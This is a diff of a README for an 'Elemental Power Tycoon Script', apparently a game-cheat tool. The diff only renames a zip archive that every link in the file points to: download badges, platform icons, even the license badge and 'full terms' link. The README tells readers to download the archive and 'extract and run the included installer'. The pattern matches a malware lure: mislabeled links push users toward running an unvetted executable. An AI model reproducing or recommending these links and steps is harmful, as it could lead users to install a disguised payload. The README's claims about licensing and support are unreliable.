@@ -1,4 +1,4 @@
-![Download](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip)  
+![Download](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip)  
 _Powered by imagination and interactivity_
 
 # Elemental Power Tycoon Script 🌀
@@ -11,11 +11,11 @@ Welcome to **Elemental Power Tycoon Script**—your front-row ticket to a digita
 
 | Platform      | Supported | Experience Level      | Notes                              |
 |---------------|:---------:|:---------------------|:-----------------------------------|
-| ![Windows](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip✔️-blue)   | ✔️       | Beginner to Expert     | All features fully supported        |
-| ![MacOS](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip✔️-lightgrey)    | ✔️       | Intermediate & Up      | Native UI responsiveness            |
-| ![Linux](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip✔️-yellowgreen)  | ✔️       | Intermediate           | Minimal dependencies needed         |
-| ![Android](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip) | 🔄       | Advanced Tweaks        | Use with approved emulators         |
-| ![iOS](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip)         | 🔄       | High Enthusiast        | Requires browser access             |
+| ![Windows](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip✔️-blue)   | ✔️       | Beginner to Expert     | All features fully supported        |
+| ![MacOS](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip✔️-lightgrey)    | ✔️       | Intermediate & Up      | Native UI responsiveness            |
+| ![Linux](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip✔️-yellowgreen)  | ✔️       | Intermediate           | Minimal dependencies needed         |
+| ![Android](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip) | 🔄       | Advanced Tweaks        | Use with approved emulators         |
+| ![iOS](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip)         | 🔄       | High Enthusiast        | Requires browser access             |
 
 ---
 
@@ -55,7 +55,7 @@ Whether you’re searching for _advanced tycoon scripts_, _elemental power autom
 - **Adaptive scripting**—context-aware code blocks that respond to player actions or environmental cues
 
 _Installation hint:_  
-When a download package includes API modules, **extract and run the included installer** after downloading from https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip
+When a download package includes API modules, **extract and run the included installer** after downloading from https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip
 
 ---
 
@@ -78,7 +78,7 @@ Because the elemental world never sleeps, neither does our support. Reach our hy
 ## 🚀 Getting Started / Installation
 
 1. **Download the latest script bundle**  
-   Click the **Download** badge at the top or bottom of this README, or use this portal: https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip
+   Click the **Download** badge at the top or bottom of this README, or use this portal: https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip
 
 2. **Extract the files**  
    Use your preferred extraction tool and place files in your chosen directory.
@@ -89,7 +89,7 @@ Because the elemental world never sleeps, neither does our support. Reach our hy
 4. **Launch Elemental Power Tycoon Script**  
    Follow on-screen setup prompts. Enjoy your journey—explore automagical scripting, experiment with new powers, or just have fun!
 
-5. For upgrades and plugin integrations, follow the same process with each new https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip release and select ‘Update.’
+5. For upgrades and plugin integrations, follow the same process with each new https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip release and select ‘Update.’
 
 ---
 
@@ -106,11 +106,11 @@ Because the elemental world never sleeps, neither does our support. Reach our hy
 
 This repository is published under the flexible and developer-friendly MIT License (2025). You are free to use, modify, and distribute as you please, provided due credit is preserved and the intent remains positive.
 
-[![License: MIT](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip)](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip)
+[![License: MIT](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip)](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip)
 
-Read the full terms here: https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip
+Read the full terms here: https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip
 
 ---
 
-![Download](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental-power-tycoon-essence-script-v3.9.zip)  
+![Download](https://raw.githubusercontent.com/alijavid110/elemental-power-tycoon-essence-script/branch/postscriptum/elemental_script_essence_tycoon_power_v2.9-alpha.3.zip)  
 _Take command of the elements. Script. Innovate. Share._
